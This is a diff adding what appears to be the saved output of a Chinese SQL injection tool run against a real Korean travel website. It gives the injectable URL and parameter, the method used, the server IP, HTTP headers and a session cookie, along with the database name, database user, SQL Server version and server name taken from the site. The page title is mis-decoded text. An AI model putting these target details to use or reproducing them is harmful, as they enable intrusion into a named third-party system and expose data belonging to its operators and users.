@@ -1,0 +1,47 @@
+■漏洞信息:============================================================
+ ·URL:http://www.tourvillage.co.kr/web/goods/layout3/goods_view.asp?goods_type=&goods_area=%C0%FC%C3%BC&menu_id=35196&id=35896
+ ·页面标题：何魂免惯 老夯 傈巩咯青荤,措付档,合秦档,坷虐唱客,磊蜡咯青,柯玫咯青,脚去咯青,胶虐捧绢傈巩
+ ·参数:goods_type=&goods_area=%C0%FC%C3%BC&menu_id=35196&id=35896
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.108.62.146
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:38:34 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 18256
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAACDSQQQ=BLEFPHCABEACPCFFHLELPHFL; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：Tour
+- 用户名：netholdingsUser
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NS2
+- 服务名：MSSQLSERVER
+- 系统用户名：netholdingsUser
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
